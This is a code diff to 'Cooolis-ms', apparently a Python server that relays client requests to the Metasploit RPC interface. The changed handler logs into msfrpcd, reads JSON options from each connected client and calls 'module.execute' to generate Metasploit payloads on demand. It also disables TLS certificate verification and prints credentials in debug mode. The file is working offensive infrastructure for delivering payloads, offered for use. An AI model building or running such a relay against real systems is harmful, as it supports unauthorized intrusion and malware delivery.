@@ -1,25 +1,30 @@
+"""
+Cooolis-ms
+------------------------------------------------
+Author:Rvn0xsy@gmail.com
+Trans Data Format:
++----------+------------------------------------+
+|          |                                    |
+|    Size  |             Data                   |
+|          |                                    |
+|          |                                    |
++----------+------------------------------------+
+"""
+
+
 import requests
 from argparse import ArgumentParser
 import msgpack
 import ssl
 import sys
+import json
 from socketserver import BaseRequestHandler,ThreadingTCPServer
 
 ssl._create_default_https_context = ssl._create_unverified_context
 
-class Cooolis_Server(BaseRequestHandler):
-    def handle(self):
-        print("Connected from: ", self.client_address)
-        while True:
-            recvData = self.request.recv(1024)
-            if not recvData:
-                break
-            self.request.sendall(recvData)
-        self.request.close()
-        print("Disconnected from: ", self.client_address)
 
-class Metasploit_RPC():
-    def __init__(self,args,**kwargs):
+class Metasploit_RPC(BaseRequestHandler):
+    def __init__(self, request, client_address, server, args):
         self.type = args.type
         self.username = args.username
         self.password = args.password
@@ -36,23 +41,34 @@ class Metasploit_RPC():
         else:
             prefix = 'http://'
         self.url = "{prefix}{host}:{port}{uri}".format(prefix=prefix,host=self.host,port=self.port,uri=self.uri)
-        
-    def start(self):
-        srv = ThreadingTCPServer(("",self.listen),self)
-        srv.serve_forever()
+        super().__init__(request, client_address, server)
 
-    def _get_token(self):
-        options = ["auth.login",self.username,self.password]
-        options = self.__pack(options)
+    @classmethod
+    def Creator(cls, *args, **kwargs):
+        def _HandlerCreator(request, client_address, server):
+            cls(request, client_address, server, *args, **kwargs)
+        return _HandlerCreator
+
+    def _request(self,options):
         try:
+            if self.debug:
+                print(self.url)
             req  = requests.post(self.url,verify=False,headers=self.headers,data=options)
             result = self.__unpack(req.content)
             if b'error' in result:
                 print("Error : %s" % str(result[b'error_message']),encoding = "utf8")
             else:
-                self.token = str(result[b'token'],encoding = "utf8")
+                return result
         except Exception as e:
             sys.stderr.write(str(e)+"\nRef:https://metasploit.help.rapid7.com/docs/standard-api-methods-referenc\n")
+
+    def _get_token(self):
+        if self.debug:
+            print(self.url,self.username,self.password)
+        options = ["auth.login",self.username,self.password]
+        options = self.__pack(options)
+        result = self._request(options)
+        self.token = str(result[b'token'],encoding = "utf8")
 
     def __pack(self,pack_str):
         return msgpack.packb(pack_str)
@@ -60,6 +76,23 @@ class Metasploit_RPC():
     def __unpack(self,pack_str):
         return msgpack.unpackb(pack_str)
 
+    def __send_payload(self,options):
+        pack_data = ["module.execute",self.token,"payload",options['payload'],options]
+        return self._request(pack_data)
+
+    def handle(self):
+        print('New connection:',self.client_address)
+        self._get_token()
+        if self.debug:
+            print("Token : {token}".format(token=self.token))
+        while True:
+            data = self.request.recv(1024)
+            data = data.decode()
+            data = json.loads(data)
+            if not data:break
+            print('Client data:',data)
+            print(self.__send_payload(data))
+            # self.request.send(payload.encode())
 
 def main():
     example = 'Example:\n\n$ python3 server.py -U msf -P msf'
@@ -74,8 +107,8 @@ def main():
     args.add_argument('-s','--ssl',help='Enable ssl',action="store_true")
     args.add_argument('-v','--versobe',help='Enable debug',action="store_true")
     parser = args.parse_args()
-    msf = Metasploit_RPC(parser)
-    msf.start()
+    server = ThreadingTCPServer(("localhost",parser.listen),Metasploit_RPC.Creator(parser))
+    server.serve_forever()
     
 if __name__ == "__main__":
     main()
